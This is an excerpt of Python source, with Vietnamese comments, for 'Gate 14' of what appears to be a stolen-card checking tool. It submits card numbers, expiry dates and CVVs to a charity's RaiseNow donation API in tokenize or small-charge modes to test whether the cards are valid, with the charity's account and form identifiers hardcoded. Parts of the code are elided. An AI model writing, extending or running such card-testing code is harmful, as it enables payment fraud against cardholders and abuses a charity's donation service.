...
# --- LOGIC CHÍNH CỦA GATE 14 ---

def check_card_gate14(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate14_mode, get_charge_value_func, custom_charge_amount=None):
    """
    Logic for Gate 14 - Dựa trên formId và payload bạn cung cấp.
    """
    gate14_mode = get_gate14_mode()
    ...
    try:
        ...
        email = random_email() # Mặc dù payload không có email, ta vẫn tạo để có thể dùng trong tương lai
        ...
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250809060833969497", # formId bạn cung cấp
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
        ...
        base_payload = {
            "account_uuid": "ae1391d9-74f1-4109-84b9-7248ee5604ea",
            "test_mode": False,
            ...
            "raisenow_parameters": {
                ...
                "solution": {
                    "uuid": "0727c95e-5d1c-4d95-a91f-6a7f676d58c7",
                    "name": "Spenden",
                    "type": "donate"
                },
                "product": {
                    "name": "tamaro",
                    "source_url": "https://donate.raisenow.io/bmqkg?lng=en",
                    "uuid": "self-service",
                    "version": "2.16.0"
                },
                "integration": {
            ...
            "profile": "d4569598-edce-4081-a911-38a3babeb848",
            "return_url": "https://donate.raisenow.io/bmqkg?lng=en&rnw-view=payment_result"
        }

        # --- CHẾ ĐỘ CHARGE ---
        if gate14_mode == 'charge':
            charge_value = get_charge_value_func('14', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": charge_value} # Đơn vị tiền tệ là EUR
        ...
        logger.error(f"Unknown error in Gate 14 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 14 System Error: {e}", bin_info
